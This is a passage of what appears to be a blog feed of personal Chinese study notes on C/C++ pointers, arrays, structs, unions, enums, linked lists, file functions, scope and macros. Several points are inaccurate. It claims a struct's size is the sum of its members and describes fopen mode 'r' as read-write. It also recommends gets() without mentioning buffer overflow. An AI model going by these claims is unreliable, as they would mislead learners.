<p>（5）动态分配存储空间：使用new赋值：格式为：<strong>ip=new 类型名 或 ip=new 类型名[个数]<strong>（个数代表该指针变量可分配到多少个的某类型的存储单元，类型可以是结构体变量名。另</strong>ip首先必须是该类型的指针变量</strong>）</p>
<p>（6）delete删去new的创建对象释放其所占有的空间，格式为：<strong>delete ip 或 delete [ ]ip</strong> （后者删去拥有不止一块存储单元的指针变量，并且格式就是如此，[]内没有其他的东西）</p>
<p>6、如果 p=&amp;i ； 那么*p就等价于i ， *&amp;i也等价于i（理解为，p里面存储着变量的地址，而指针符号是指向该地址。所以，如果指针未赋值时， *ip可认为是一个未赋值的变量）</p>
<p>7、如果使用（*ip）++时，是否有圆括号表达不一样的意思：</p>
<p>有圆括号时：先*和ip结合，表示的是指针ip指向地址的变量在使用后数值加1</p>
<p>无圆括号时：ip先与++结合，又++在后边，则在使用完*ip后把ip的值加1，即为ip指向的不再是原本变量，而是地址更高的相邻变量</p>
<ul>
<li>指针常量：指向的数据是常量。如 const char* p = “abc”; p指向的内容是常量 ，但p本身不是常量，你可以让p再指向”123”。 </li>
<li>常量指针：指针本身是常量。如：char* const p = “abc”; p本身就是常量，你不能让p再指向”123”。 </li>
<li>指针常量 + 常量指针：指针和指针指向的数据都是常量。const char* const p =”abc”; 两者都是常量，不能再修改。</li>
</ul>
<h3 id="二、指针与数组"><a href="#二、指针与数组" class="headerlink" title="二、指针与数组"></a>二、指针与数组</h3><p>1、数组名是一个数组的首地址，例如一维数组a中a与&amp;a[0]都表示数组的首地址（一维数组中a[0]只表示元素，二维数组中a[0]表示第0列的首地址）</p>
<p>2、数组的首地址是<em><strong>常量</strong></em>，不能被改变</p>
<p>3、c语言中规定：<strong>一维数组中a[i]的地址是a+i，如果ip=a，那么也可写成ip+i（构成了循环条件，如果是指针，还可以直接写成ip++，因为指针变量不是常数）</strong></p>
<p>4、当指针变量ip取了数组a的地址的时，那么ip[i]与a[i]表示的元素一致，可<strong>看为</strong>一个数组在起作用</p>
<p>5、指针变量可进行加减整数和两指针相减的算术运算</p>
<p>（1）移动指针（指针加减整数） 例如ip+1或者ip-1看似是加减1就指向了临近的存储单元，但是实质是加减的数会乘以数据类型所占据的字节数，因为一个字节就是一个存储单元，所以这里的1，我将之理解为一<strong>块</strong>存储单元</p>
<p>（2）两指针相减：指向同一块连续的存储单元（数组）的两个指针变量可以相减（p-q），值代表两个指针变量之间的相距的元素个数，可以为负数</p>
<p>6、指向同一块连续的存储单元（数组）的指针间可以进行比较（使用所指向的数组元素的地址大小进行比较）</p>
<p>7、字符指针定义为：<em><em>char <em>sp；sp=“OK!”</em></em> ，以上把OK!这个字符串的首字符的地址赋值给字符指针，那么就可以用sp这个字符指针存取该字符串，此时与字符串数组相似，sp[1]的值为K，并且与字符串数组一致，同样是</em><em>以空字符结尾</em>*</p>
<p>8、当想使用scanf输入函数为字符指针变量赋值时，字符指针变量此时一定要能指向某个确定的地址，比如把字符数组的地址赋给字符指针，否则，字符指针将指向任意地址，可能导致程序崩溃</p>
<p>9、指针一旦指向某个地址时，去改变如*ip的任何值，都是相当于改变其指向的地址所对应的数组、变量等</p>
<p>10、二维数组中的每行的首地址为其首个元素，例如a[3] [5],第0行的首地址为a[0]（或者为a）,第1行首地址为a[1]（或者为a+1）</p>
<p>而0行第j列元素的地址为a[0]+j（或者表示为*a+j），第1行j列元素的地址为a[1]+j（或者表示为 *(a+1)+j）</p>
<p>推广到i行，j列的地址则为a[i]+j；*(a+i)+j；&amp;a[i] [j] 。若是要表示a[i] [j]则在前面的表达式加 *()</p>
<p>11、使用简单同类型指针变量存取二维数组时，给指针p赋予首地址：p=&amp;a[0] [0]；p=*a；p=a[0]（不可以用数组名进行赋值）</p>
<p>使用p指向a[i] [j]为*(p+i *列的总数+j) </p>
<p>12、int (*pi)[5]表示，定义一个整型指针（称为行指针），该指针指向一个含有五个整型元素的数组</p>
<p>13、如果有一个二维数组列数也为第12点中的5列时，此时可以执行pi=a，则此时用pi存取二维数组的用法与10中一致</p>
<p>14、定义指针数组：*<em>类型标识符 <em>指针名[元素个数]</em></em> 如果把一个二维数组的每行的首地址都给指针数组相应的指针，那么则存取二维数组的方法与10中一致</p>
<p>15、使用指针字符数组：*<em>char <em>p[字符串个数]=｛字符串｝</em></em> 会为每个字符串分配相应的空间，不会造成空间的浪费，用法与字符串数组一致</p>
<p>16、二维字符串数组，每行的首地址输出时就表示一整行的字符串（看成一个一维的字符串数组）</p>
<h3 id="三、指向指针的指针变量"><a href="#三、指向指针的指针变量" class="headerlink" title="三、指向指针的指针变量"></a>三、指向指针的指针变量</h3><p>1、指向指针的指针变量：通过多次（一般为两次）指向地址，从而指向最终的一个变量值</p>
<p>格式为：<strong>类型标识符  * * 指针变量名；</strong></p>
<p>2、可以把一个指针数组的首地址赋值给指向指针的指针变量（很好理解：指针数组里面的指针元素就代表着地址，而指针数组首地址指向这些，类似于指向指针）</p>
<h3 id="四、指针与结构体、共用体"><a href="#四、指针与结构体、共用体" class="headerlink" title="四、指针与结构体、共用体"></a>四、指针与结构体、共用体</h3><p>注：结构体与共用体较为类似，与指针的用法一致，故以下只提供一种</p>
<p>1、指向结构体：结构体同样存在连续空间，以及首地址，把这个首地址赋值给一个指针变量，则该指针指向结构体</p>
<p>格式：**struct 结构体名 *指针变量名**（c++中可省略struct）</p>
<p>2、若有一个与指针同个结构体类型的结构体变量book，则指针变量<strong>p=&amp;book</strong>，此时，p指向了book；共有三种办法存取结构体中的成员：</p>
<p>（1）<strong>book.成员名</strong> 学结构体的最基本的取用语法</p>
<p>（2）<strong>p-&gt;成员名</strong> 指针的取用语法，借用由-和&gt;组合成的指向运算符取用成员（常用）</p>
<p>（3）**(<em>p).成员名</em>* 圆括号不可省略，因为根据运算符优先级， “ . ”  的优先级高于“*”</p>
<p>3、如果是结构体数组book[i]，p=book，那么p指向book[0]，(p+1)指向book[1]······</p>
<p>4、指针变量指向带有位段的结构体变量时，用法与指向结构体一致</p>
<h3 id="五、指针与枚举型"><a href="#五、指针与枚举型" class="headerlink" title="五、指针与枚举型"></a>五、指针与枚举型</h3><p>1、指向枚举型的指针的定义与结构体、共用体一致，就不再重复说明</p>
<p>2、指向枚举型的指针，用法就一个：*<strong>p等价于e</strong>（p为指针，e为枚举型变量）</p>
<p>3、补充前面的枚举型：每个枚举型里面的枚举值，都代表着一个整数，某种意义上来说，就是一个整型的数，所以才会有类型强制类型转化的语法<strong>（enum 枚举类型名）（枚举变量+或-常数）</strong></p>
<p>所以，*p的表示，可以指向某个枚举值，也可以被转化为该枚举值对应的整型数</p>
<h3 id="六、指针与函数"><a href="#六、指针与函数" class="headerlink" title="六、指针与函数"></a>六、指针与函数</h3><p>1、指针函数：返回指针类型的函数 格式：**数据类型 *函数名(形参表)*<em>（调用函数时，</em>不用写进去，跟之前的函数调用一致，只写函数名（形参表）即可，当然需要声明的情况也别忘了）</p>
<p>2、指针函数中的return返回的值是变量的地址、数组元素的首地址、指针变量、结构体、共用体等的首地址</p>
<p>3、接触到一个新的类型标识符<strong>bool</strong>，定义之后，变量只能被赋值true或者false</p>
<p>4、<strong>指针变量</strong>作为函数的<strong>形参</strong>时，那么调用函数时，圆括号也应是<strong>某变量的地址</strong>，保持类型一致</p>
<p>当使用*指针运算符对形参进行运算就可以改变实参的值 </p>
<p>5、主函数main()的形参：带形参的主函数首部形式为*<em>int main(int argc,char <em>argv[])</em></em></p>
<p>整型argc代表命令行总的参数个数(包括程序名)，指针数组argv中每个元素指向命令行对应的参数字符串，假设有三个字符串，那么argv[0]代表输入的第一个字符串</p>
<p>6、函数名是函数的首地址，是一个地址常量，不可被改变</p>
<p>7、函数指针：指向函数的指针变量，通过指向函数的首地址，从而调用函数</p>
<p>格式：*<em>数据类型  (<em>函数指针变量名)(形参表)</em></em></p>
<p>注：函数指针与指针函数差在一个圆括号上，需注意！</p>
<p>8、定义的函数指针，可以指向<strong>一类</strong>的函数，只要<strong>数据类型和形参表中的形参类型相同（不要求形参变量相同）</strong>。就可用如p=fun给函数指针赋值，此时，p(形参)等价于fun(形参)</p>
<p>9、<strong>函数指针主要用于函数之间的传递函数，即主调函数中用其他的函数名作为实参，被调函数中函数指针作为形参，这样把函数的入口地址传给形参，从而在被调函数中使用传入的函数</strong></p>
<h3 id="七、链表（单向链表）"><a href="#七、链表（单向链表）" class="headerlink" title="七、链表（单向链表）"></a>七、链表（单向链表）</h3><p>1、结点：除了存储数据，还存储该数据的后继结构体的地址的结构体</p>
<p>链表：存储着n个数据的结点通过next指针连接下一个结点而拉成一条类似链子的数据集合</p>
<p>2、用指针函数进行建立单向链表：使用*<em>struct 结构体变量名 <em>p;p=new 结构体变量名</em></em> 开辟动态存储空间，创建的第一个空间即为头结点。头结点的地址应该存放在两个指针里面，一个用来最后的返回头结点地址，另一个用来进行创建链表，尾结点要用NULL进行置空。</p>
<p>3、单向链表结点的插入：（1）s-&gt;next=p-&gt;next;   (2)p-&gt;next=s; （s，p均为指向结构体的指针）</p>
<p>4、单向链表结点的删除：（1）p-&gt;next=q-&gt;next; (2)delete q;   （p，q均为指向结构体的指针）</p>
<h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><h3 id="一、文件概念"><a href="#一、文件概念" class="headerlink" title="一、文件概念"></a>一、文件概念</h3><p>1、文件：储存在外部存储介质上的数据集合</p>
<p>每个文件都有一个名字，称为文件名，对于文件的存取都是按照名字进行的</p>
<p>2、ASCⅠⅠ文件：由许多的字符组成的</p>
<p>二进制文件：仅将字节中的二进制按照原样输出</p>
<h3 id="二、文件指针"><a href="#二、文件指针" class="headerlink" title="二、文件指针"></a>二、文件指针</h3><p>1、缓冲文件系统会为每个文件开辟一片区域，用于存放文件的信息。存储形式采用结构体类型的变量，该变量名字为FILE（注意是<strong>大写</strong>）</p>
<p>2、所以文件指针定义为*<em>FILE <em>fp;</em></em> </p>
<h3 id="三、文件的打开和关闭"><a href="#三、文件的打开和关闭" class="headerlink" title="三、文件的打开和关闭"></a>三、文件的打开和关闭</h3><p>1、文件打开函数为<strong>fopen()</strong></p>
<p>格式为：<strong>fp=fopen(文件名,文件打开方式);</strong> （fp是文件指针，文件名：要打开的文件路径和文件全名（文件名.拓展名））<strong>注：文件名与文件打开方式要在””里面</strong>   (还有，一般还要检验文件是否成功打开，用fp是否等于NULL进行判别)</p>
<table>
<thead>
<tr>
<th align="left">文件打开方式</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td align="left">r或rt</td>
<td>以读写的方式打开一个文本文件，此文件必须存在，只能读</td>
</tr>
<tr>
<td align="left">w或wt</td>
<td>以只写的方式建立并打开一个文本文件。若文件已经存在，则打开时清空原内容，只允许写</td>
</tr>
<tr>
<td align="left">a或at</td>
<td>以追加的方式打开一个文本文件，并将写入的内容添加到文件的末尾。若文件不存在，则新建一个文本文件。</td>
</tr>
<tr>
<td align="left">rb</td>
<td>以只读的方式打开一个二进制文件，此文件必须存在，只允许读</td>
</tr>
<tr>
<td align="left">wb</td>
<td>以只写方式建立并打开一个二进制文件。若文件已经存在，则打开时清空原内容，只允许写</td>
</tr>
<tr>
<td align="left">ab</td>
<td>以追加方式打开一个二进制文件。若文件不存在，则新建一个二进制文件</td>
</tr>
<tr>
<td align="left">r+或rt+</td>
<td>以读/写方式打开一个文本文件。此文件必须存在，允许读和写</td>
</tr>
<tr>
<td align="left">w+或wt+</td>
<td>以读/写方式建立并打开一个文本文件。若文件已经存在，则打开时清空原内容，允许读和写</td>
</tr>
<tr>
<td align="left">a+或at+</td>
<td>以读/追加写方式打开一个文本文件。若文件不存在，则新建一个文本文件</td>
</tr>
<tr>
<td align="left">rb+</td>
<td>以读/写方式打开一个二进制文件，此文件必须存在，允许读和写</td>
</tr>
<tr>
<td align="left">wb+</td>
<td>以读/写方式建立并打开一个二进制文件。若文件已经存在，则打开时清空原内容，允许读和写</td>
</tr>
<tr>
<td align="left">ab+</td>
<td>以读/追加写方式打开一个二进制文件。若文件不存在，则新建一个文本文件</td>
</tr>
</tbody></table>
<p>2、如果文件打开不成功，将返回一个空指针值NULL，可以据此判断是否成功打开文件。</p>
<p>3、缓冲文件系统中，文件使用完毕要及时关闭，否则可能导致文件信息丢失，或者被误操作而损坏</p>
<p>4、文件关闭函数<strong>fclose()</strong></p>
<p>格式为：<strong>fclose(文件指针)</strong> （正常关闭函数，fclose返回值是一个整数0，否则返回EOF即-1）</p>
<h3 id="四、文件的读取和写入"><a href="#四、文件的读取和写入" class="headerlink" title="四、文件的读取和写入"></a>四、文件的读取和写入</h3><p>1、<strong>fputc(ch,fp)</strong>; 向一个允许写或者读写方式打开的文件写入一个字符（ch表示一个写入文件的字符，fp表示文件指针）（输出成功返回字符的ASCII值，失败则返回EOF即-1）</p>
<p>2、<strong>ch=fgetc(fp);</strong> 从一个允许读或者读写方式打开的文件读取一个字符（当读的是文本文件时，读取到末尾时返回EOF，即-1）</p>
<p>3、<strong>feof(fp);</strong> 判断一个文件是否到文件的末尾，到末尾则返回1，没到末尾则返回0（可用于循环语句的判断条件）</p>
<p>以上函数虽是一个个的读取，但是可用循环语句（while () 很适合）进行重复读取或写入</p>
<h3 id="五、文件的定位函数"><a href="#五、文件的定位函数" class="headerlink" title="五、文件的定位函数"></a>五、文件的定位函数</h3>]]></content>
  </entry>
  <entry>
    <title>c语言——构造数据类型与函数笔记</title>
    <url>/2020/10/22/2020-10-22-c%E8%AF%AD%E8%A8%80%E2%80%94%E2%80%94%E2%80%94%E6%9E%84%E9%80%A0%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="构造数据类型"><a href="#构造数据类型" class="headerlink" title="构造数据类型"></a>构造数据类型</h1><h3 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h3><p>1、数组：一批类型性质相同的数据的集合</p>
<p>2、数组定义与之前的变量并无太大差异，只是在其后面多了维数，以及组中的个数。一维则[]中的数字表示为数组元素的总数，若二维则[] []表示几行几列（先行后列）的数据</p>
<p>3、数组名不与变量名重复，一样也不可以取用关键词作为组名，定义数组元素的个数（称为数组长度或数组大小）不能含有变量，定义为常量的可以（里面进行加减乘除也可，有具体整数值都可）</p>
<p><strong>注：不能直接引用整个数组，只能使用数组中的某个数据（字符串数组除外）</strong></p>
<p>4、数组下标从0开始，（一维数组的最后一个数据为数组长度减1，例如Score[10]，第一个元素为Score[0]最后一个元素为Score[9]）</p>
<p>5、数组的赋值有三种:（1）用循环语句进行有规律的赋值（2）循环语句中利用输入函数进行逐个输入 （3）初始化，在定义数组时，直接用花括号赋指，（按照顺序赋值，如果数据数量不够，则后面的数据直接赋值为0；如果过大，将报错）</p>
<p>6、数组名代表的是一个内存单元地址，所以若是直接使用数组名进行输入函数取值，就无需使用&amp;（应用在字符数组上）</p>
<p>7、对于数组排序的冒泡排序和选择排序，重点在于内层循环变量的取值范围变化，是朝着小变化或是朝着大变化，决定了数组排序的是从小到大还是从大到小；而内层循环变量的取值范围应该越来越小，因为已经排序的应该将之排除在外</p>
<p>8、二维数组：例如a[x] [y] （两个[]不能简写成[x,y]，是错误语法）代表数组a由x行y列组成，一共x*y个元素；表示的最大下标x-1，y-1</p>
<p>9、二维数组的存放顺序是一行一行的填充，比如先填满第0行，才会开始填第一行</p>
<p>10、二维数组的赋值：</p>
<p>（1）直接在后面跟=｛｝，里面可以直接填写数字直到满（不建议，十分不清晰）或是每一行用｛｝括起来，会清晰明了许多，各个｛｝间用“，”隔开（如果一次性写满，则可以省略行里面的数字，列不行</p>
<p>（2）如果是每行通过｛｝隔开的情况，则可以只填写该行前几列的数据，其他的将会被系统填0</p>
<p>  11、c语言中没有定义字符串类型的函数，但是可以使用数组来处理字符串，定义方式与之前的数组并无太大区别，只需注意以下几点：</p>
<p>（1）如果在初始化定义时，用单个字符定义，则每个字符需使用 ‘  ‘ 括起来，但是没有赋值的将被系统填充’\0’；故此，与之前数组一致，如果要将所有数组都变为0；则输入’\0’即可</p>
<p>（2）初始化时可以直接用字符串赋值，字符串使用”  “括起来，之后系统将会自动补充’\0’（只有结尾是空字符的字符数组可以用%s直接输出），所以如果用字符串赋值，存储的字节数将会是字符串的长度加1（所以需要注意数组长度是否够大）</p>
<p>（3）使用printf与scanf两个函数时，如果定义为%c时，后面跟的必须是如a[n]这般的某个具体的位置。需使用循环语句进行一个一个字符进行输入/输出，输入时候各个字符不必用空格隔开，因为此时空格也将被认为是一个字符存储在数组里；并且如果数值长度仍够，按下的回车键也同样会被存储在数组中</p>
<p>​        另：如果为%s，后面跟的变成如a这般的数组名，作为一个整体的地址，有个需注意，在输入函数scanf中使用时，若输入空格将会被认为是已经完成了输入</p>
<p>（4）上面的方法其实过于复杂，而对于含有字符的数组，在string的头文件中有专门的一些函数可以帮忙处理：</p>
<p>gets(字符数组名)：输入的字符串赋值给字符数组，并且空格不会被认为是结束的标志，只有回车才是，所以可以输入多个字符串</p>
<p>puts(字符数组名)：输出字符数组里的内容</p>
<p>strcat(字符数组1，字符数组2)：把字符数组2的内容直接放入字符数组1中并连接在其后面(前提是字符数组1的长度够大)</p>
<p>strcpy(字符数组1，字符数组2)：把字符数组2的内容直接复制到字符数组1中，注意是<strong>覆盖式</strong>的（前提是字符数组1的长度比2的大或等）</p>
<p>strcmp(字符数组1，字符数组2)：把字符数组1和字符数组2的字符按照从左往右的顺序进行ASCII码值的比较，直至出现不同的字符或者遇到末尾的’\0’停止；若是两者相等，则函数返回值为<strong>0</strong>；若是前者大于后者，则函数返回值为<strong>正整数</strong>；若是前者小于后者，则函数返回值为<strong>负整数</strong>（相比的为同位置的字符，一旦比出结果立刻停止比较，返回函数值）</p>
<p>strlen(字符数组)：计算字符数组中的字符个数。不包括’\0’</p>
<p>strlwr(字符数组)：把字符数组中的大写字符转换为小写字符</p>
<p>strupr(字符数组)：把字符数组中的小写字符转换为大写字符</p>
<p>12、循环结构与数组是黄金搭档，经常配合使用</p>
<p>13、定义数组时里面的[ ]可以是字母，但必须是某个具有确定的值的字母，总之值一定得是确定的</p>
<p>14、字符数组直接赋值为字符串时，可以被另一个字符串（长短不一定要一致）直接覆盖。</p>
<p>15、字符串的一维数组只能存放一个字符串，而二维数组可用来盛放多个字符串（每行存放一个字符串），其列表示每行所能容纳的最大的字符个数（会造成空间浪费，后面有指针数组，才是更好的选择）</p>
<h3 id="二、结构体"><a href="#二、结构体" class="headerlink" title="二、结构体"></a>二、结构体</h3><p>1、结构体（struct）：把若干个不同类型的变量组合到一起构成的的数据类型</p>
<p>2、声明格式：**struct 结构体名 {成员}; **  。（定义的内容，定义方式与定义变量、数组方式一致）</p>
<p>3、结构体中的各个部分称为成员，而成员名可以与结构体之外定义的变量名相同，但不能与关键字同名。</p>
<p>4、（要先声明，才能有此步骤的定义）使用结构体格式为：**struct 结构体名 变量名 **，若是要初始化，则用{}括起来，里面的数据类型按顺序且与结构体中的成员数据类型相同，如果赋值数据个数不够，则剩余补0；超过则出错</p>
<p>5、结构体将引入“.”这个符号进行对成员赋值：<strong>变量名.成员名=？</strong>进行赋值，若是出现多层嵌套的结构体，则通过多个  <strong>.</strong>  进行连接，由最外层到最内层逐层的排序</p>
<p>6、直接使用变量名代表对结构体中第一个的成员进行赋值，若对特定的某个成员赋值，需要用  <strong>.</strong></p>
<p>7、使用结构体定义的变量，就拥有了结构体中的成员作为该变量的属性，那些成员好似成为变量名头下的一个个标签</p>
<p>8、结构体数组就是把结构体定义的变量的方式换成了去定义一个数组，在处理一些相同类型的数据上可以简化代码，其余并无差别</p>
<p>9、位段：在一个结构体中使用指定长度的位（二进制位）作为单位的成员（大多数情况下是用不到的）</p>
<p>格式与结构体定义几乎一致，唯一差别就是在定义的成员后面加上   <strong>: 位的个数</strong>，如int num :8;</p>
<p>10、同个结构体名定义下的不同变量可以直接使用赋值语句用于值的交换</p>
<p>11、结构体变量所占存储空间的大小等于各个成员的存储空间之和</p>
<p>12、结构体运用在某个变量拥有多种方面的数据类型</p>
<h3 id="三、共用体"><a href="#三、共用体" class="headerlink" title="三、共用体"></a>三、共用体</h3><p>1、共用体（union）：多个不同类型数据共享空间的构造类型。在其里面的成员<em><strong>共用一个存储空间</strong></em>，都是从相同的物理地址开始</p>
<p>2、用法与结构体一致，可参考结构体的做法，直接模仿</p>
<p>3、共用体中允许嵌套。即：里面的成员可以是数组，指针，结构体和共用体（结构体也是如此）</p>
<p>4、共用体变量所占的空间大小取决于占存储空间最大的那个成员，与结构体要区分开！</p>
<p>5、在共用体初始化时只能对第一个成员的值进行初始化</p>
<p>6、共用体中的成员只能有一个成员有值，因为一旦对某个成员赋值，就会覆盖其他成员原来的数据，因此最后一次赋值是共用体起作用的数值</p>
<p>7、当共用体里面嵌套结构体时，结构体的成员共用共用体里的空间，分配顺序默认为从低地址到高地址</p>
<p>8、运用在某个数据可能用的类型有多种，而进行选择</p>
<h3 id="四、枚举类型"><a href="#四、枚举类型" class="headerlink" title="四、枚举类型"></a>四、枚举类型</h3><p>1、枚举：把变量所有可能取值一一罗列出来，增加程序的可读性</p>
<p>2、声明格式：**enum 枚举名 ｛枚举值｝;**（枚举值可为字符串（不要加双引号），将会被系统作为整型常量处理；不同的枚举值之间用’ , ‘隔开）</p>
<p>3、枚举值无特定的赋值序号时，则从0开始逐个加1递增给予序号；另外对某一枚举元素赋值序号，而其后无赋值序号，则从该序号开始加1递增</p>
<p>4、可以通过使用switch（枚举值的序号）｛｝语句来对枚举变量进行输入和输出</p>
<p>5、枚举类型定义里面的枚举元素，好像一个个存储着的值，是需要经过选择然后再将其赋值给变量，变量才能具有那个枚举值，不能使用枚举值的序号进行赋值，必须输入全名；若是要用序号赋值，需要的格式为：<strong>（enum 枚举名）（某序号）</strong></p>
<p>6、枚举值的序号可用来比大小，作为判断条件</p>
<p>7、用某类型的一个枚举变量为另一个该类型枚举变量赋上枚举值：a=(enum) 枚举名 (b+1)（a，b为同类型枚举变量，b+1表示一个标量的序号，加1只是举例，可以进行其他运算）</p>
<h3 id="五、自定义类型名"><a href="#五、自定义类型名" class="headerlink" title="五、自定义类型名"></a>五、自定义类型名</h3><p>1、自定义类型：使用typedef声明一种新的类型名来代替已有的某类型名</p>
<p>2、语法格式：<strong>typedef 某类型名 新类型名</strong> （新类型名习惯上用大写字母表示，以便与已有的进行区分）</p>
<p>3、某类型名可以是float，int这类标准数据类型；也可以是结构体，共用体，枚举；</p>
<p>4、这个关键字的用法类似一种格式刷的感觉，可以将你“刷”过的类型去把别的变量的类型变得一致</p>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h3 id="一、函数概述、自定义、调用"><a href="#一、函数概述、自定义、调用" class="headerlink" title="一、函数概述、自定义、调用"></a>一、函数概述、自定义、调用</h3><p>1、函数：是对数据进行一系列的操作，而去完成某个特定功能的过程。好似一种公式，把数据套进去一样</p>
<p>2、函数分为系统库函数与用户自定义函数，前者由编译系统提供，用户输入头文件便可以调用；而后者是程序员自行定义与设计，用来完成某项特定的功能。</p>
<p>3、自定义函数格式：<strong>类型标识符 函数名 (形式参数表){函数体（即：某种运算过程）}</strong></p>
<p><strong>注：类型标识符是执行完该函数程序，数据返回的类型定义；函数名不可以与关键字重名，在整个程序中是唯一的；｛｝后面无” ; “    函数定义中不能再定义一个新函数；形参定义格式例如 int a，int b，······</strong></p>
<p>4、形参类似一个公式里面的x，y，在使用函数时，格式应按照形参的样式进行调用；调用时便把值赋予形参进行运算然后在返回出去需要的值。（两者个数必须相等）</p>
<p>5、return 表达式或return （表达式）返回函数值，不写时，函数返回类型应该为void；写入时，结束函数体的执行，程序回到调用该函数的地方，并把其后表达式的值按照类型标识符的数据类型返回给主调函数（也就是把值输出）</p>
<p>6、跟在return后的表达式返回值的数据类型必须跟定义函数时的数据类型一致，不一致时将以定义函数时的数据类型为准，进行强制类型转换</p>
<p>7、当定义函数时省略返回值的数据类型定义，系统将默认为int型</p>
<p>8、 当把自定义函数的定义语句写到主调函数的后面时，在使用自定义函数前需要加上自定义函数的声明（格式为： 类型标识符 函数名 （类型 形参1，类型 形参2，）或者（类型，类型···））；若是函数定义写在主调函数之前则不必写声明</p>
<p>9、函数定义中不能嵌套函数，但是调用函数产生的值却可以再套在函数里面，如：min(min(a,b),min(c,d)) 计算出a,b,c,d四个里面的最小值</p>
<p>10、函数里面若包含输出语句（printf，puts等），在调用时是会输出里面的语句</p>
<h3 id="二、函数的参数传递"><a href="#二、函数的参数传递" class="headerlink" title="二、函数的参数传递"></a>二、函数的参数传递</h3><h4 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h4><p>1、值传递：调用函数时，主调函数把实参的值赋值给形参。</p>
<p>2、形参的值变化不会影响实参的值，形参一般为变量，实参可以是变量、常量、表达式</p>
<h4 id="地址传递"><a href="#地址传递" class="headerlink" title="地址传递"></a>地址传递</h4><p>1、地址传递：主调函数把实参的地址传递给形参，作为形参的地址</p>
<p>2、当进行的为地址传递时，形参和实参共用一个地址，共用一个存储空间，即形参的改变就是实参的改变</p>
<p>3、表示地址传递的有<strong>数组名、&amp;变量、字符串、指针变量</strong></p>
<p>4、当实参是二维数组，形参可以是一维数组，此时不能直接将实参数组名填入括号内，类型将不匹配；应填入：数组名 [0] ，在此时作为一个起始地址转变为一维数组的排列方式。二维数组关系如a[i] [j]=b[i*n+j]（i，j为双层循环的循环数，n为二维数组a的列数）</p>
<h3 id="三、函数的调用"><a href="#三、函数的调用" class="headerlink" title="三、函数的调用"></a>三、函数的调用</h3><p>1、一个函数内不能再定义另一个函数，但是函数体（即在｛｝里的内容）内可以对其他的函数进行调用，也可以调用该函数本身，对其他函数要记得声明函数即可</p>
<p>2、函数名后的括号里面可以是各种各样的表达式，可以更好调用函数，发挥出我们想要的效果</p>
<p>3、设计函数的目的在于简化程序，把每一步要做的归成一个相对独立的函数进行完成，然后在一步步的考虑其他细节，最终完成一个复杂的程序</p>
<p>4、一个函数在自身函数体内调用自己称为直接递归调用；调用其他函数称为间接递归调用；</p>
<p>5、使用直接递归调用需满足两个条件：（1）递归模式，好似数学中的单个函数自身层层嵌套，有点循环语句的感觉，但却能完成一些循环语句难以完成的程序（2）递归出口，一般到1或0脱离递归</p>
<p>6、当函数在不同源文件时一样可以调用函数，只需在调用之前进行函数声明即可</p>
<h3 id="四、变量的作用域和生存期"><a href="#四、变量的作用域和生存期" class="headerlink" title="四、变量的作用域和生存期"></a>四、变量的作用域和生存期</h3><p>1、变量的作用域指变量的有效范围，即可以引用变量的区域；分为全局变量和局部变量。</p>
<p>局部变量：在定义的代码块内定义且作用</p>
<p>全局变量：在函数外部定义的变量，作用域从定义开始直到源文件结束，但是如果在某个函数内有同名的局部变量，则局部变量的值生效，全局变量值被隐藏</p>
<p>2、代码块：在一对花括号里面的代码段，包括函数体以及函数体内的语句块</p>
<p>3、在每个代码块内定义的变量都只能在其内使用，所以可以在不同的代码块使用相同的变量名，并且不会互相干扰，比如：在一个函数内定义i为10；则在整个函数内i都有一个为10的值；而在此时使用了如if语句，且是使用了｛i=0｝，那么在if的花括号里，i为0，但是不在花括号里的i仍然为10。我理解为优先级别问题，级别高优先展示，却不会覆盖</p>
<p>4、变量的生存期：变量值在程序运行过程中存在的期限，即从系统为变量分配存储单元开始到将存储单元收回为止。</p>
<p>5、C语言程序占据的存储空间分为程序区、静态存储区和动态存储区</p>
<p>程序区：用于存放程序</p>
<p>静态存储区：程序开始执行时就分配的固定存储单元，如全局变量。其生存期从程序运行开始到程序的结束</p>
<p>动态存储区：函数调用过程中进行动态分配的存储单元，如函数形参、自动变量、函数调用时的现场保护和返回值地址。其生存期从定义变量开始到函数（或复合语句）运行结束为止</p>
<p>6、一些说明存储类型的关键字：（1）auto 自动变量（2）static 静态变量 （3）register 寄存器变量 （4）extern （外部变量）（存储类型关键字写在以前定义变量最前面，或者写在类型标识符和变量之间）</p>
<p>7、（1）未说明存储类型的变量默认为自动变量，所以auto常常省略；</p>
<p>（2）使用static 静态变量只会初始化一次，之后再次使用，不会再进行赋值，其值应该为上次调用后的值；</p>
<p>（3）register 寄存器变量：借用寄存器可以使得运算更快，但是寄存器数量有限，不够时，将自动转为自动变量。并且寄存器长度有限，寄存器变量只能是字符型、整型、指针类型的变量；</p>
<p>（4）外部变量 ：是定义在函数外部的全局变量（存放在静态存储区）。使用extern声明外部变量时，可以把之后定义的外部变量的作用域提前到extern定义的位置，或者在不同的源文件里面使用变量</p>
<p>（5）如果在定义全局变量时加一个static会构成静态全局变量。那么将无法使用extern进行拓展作用域到其他源文件中，但是可以通过同在一个源文件内的函数进行间接调用</p>
<h3 id="五、宏定义"><a href="#五、宏定义" class="headerlink" title="五、宏定义"></a>五、宏定义</h3><p>1、宏定义：将一个标识符（宏名）定义为一个字符串。分为无参宏定义与带参宏定义</p>
<p>2、无参宏定义：定义一个没有参数的宏。语法格式：**#define 宏名 字符串**</p>
<p>（1）不需要在后面在分号“  ；”</p>
<p>（2）宏定义使用一个宏名代替一个字符串，仅仅是简单的替换，不分配内存空间</p>
<p>（3）宏定义可以引用已经定义的宏定义，进行嵌套</p>
<p>（4）宏定义过的宏名在整个作用域内不能在改变</p>
<p>（5）宏定义可与常量用法相似，用数字去替换宏名</p>
<p>（6）程序中如果在为宏名加上了双引号，将表示为一个字符串，而不是一个宏，所以此时不会进行宏替换</p>
<p>3、带参宏定义：定义一个带形式参数的宏。语法格式：**#define 宏名(形参表) 字符串** 。  </p>
<p>调用带参宏时格式为：<strong>宏名(实参表)</strong>  [其用法与函数的形参与实参相类似，可进行串记（但不能混为一谈）]</p>
<p>（1）形参（实参）表是指一至多个的形参，形参间用逗号隔开</p>
